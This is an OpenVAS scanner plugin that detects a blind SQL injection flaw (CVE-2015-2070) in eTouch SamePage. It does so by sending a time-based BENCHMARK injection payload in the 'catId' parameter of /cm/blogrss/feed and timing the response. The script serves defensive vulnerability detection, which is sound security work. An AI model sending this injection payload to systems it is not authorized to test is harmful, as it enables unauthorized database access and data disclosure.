###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_etouch_samepage_catid_sql_inj_vuln.nasl 11452 2018-09-18 11:24:16Z mmartin $
#
# eTouch SamePage 'catId' Parameter SQL Injection Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805152");
  script_version("$Revision: 11452 $");
  script_cve_id("CVE-2015-2070");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-18 13:24:16 +0200 (Tue, 18 Sep 2018) $");
  script_tag(name:"creation_date", value:"2015-03-16 16:36:52 +0530 (Mon, 16 Mar 2015)");
  script_name("eTouch SamePage 'catId' Parameter SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 18080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36089");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/130386");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Feb/47");

  script_tag(name:"summary", value:"The host is installed with eTouch
  SamePage and is prone to blind sql injection vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to execute sql query or not.");
  script_tag(name:"insight", value:"Flaw is due to the /cm/blogrss/feed
  script not properly sanitizing user-supplied input to the 'catId' parameter.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database,
  allowing for the manipulation or disclosure of arbitrary data.");
  script_tag(name:"affected", value:"eTouch SamePage Enterprise Edition
  4.4.0.0.239, Prior versions may also be affected.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

wait_extra_sec = 5;

http_port = get_http_port(default:18080);

foreach dir (make_list_unique("/", "/samepage", cgi_dirs(port:http_port)))
{

  if( dir == "/" ) dir = "";

  sndReq = http_get(item:string(dir, "/cm/newui/wiki/index.jsp"), port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if(">SamePage" >< rcvRes && ">Dashboard<" >< rcvRes)
  {
    ## Added three times, to make sure its working properly
    sleep = make_list(15000000, 25000000);

    ## Use sleep time to check we are able to execute command
    foreach sec (sleep)
    {
      url = "/cm/blogrss/feed?entity=mostviewedpost&analyticsType=blog&catId=-1)" +
            "%20AND%202345=BENCHMARK(" + sec + ",MD5(0x6b4e6459))%20AND%20(4924=" +
            "4924&count=10&et_cw=850&et_ch=600";

      sndReq = http_get(item:url, port:http_port);

      start = unixtime();
      rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
      stop = unixtime();

      time_taken = stop - start;
      sec = sec / 5000000;

      if(time_taken + 1 < sec || time_taken > (sec + wait_extra_sec)) exit(0);
    }
    report = report_vuln_url( url:url, port:http_port);
    security_message(port:http_port, data:report);
    exit(0);
  }
}

exit(99);
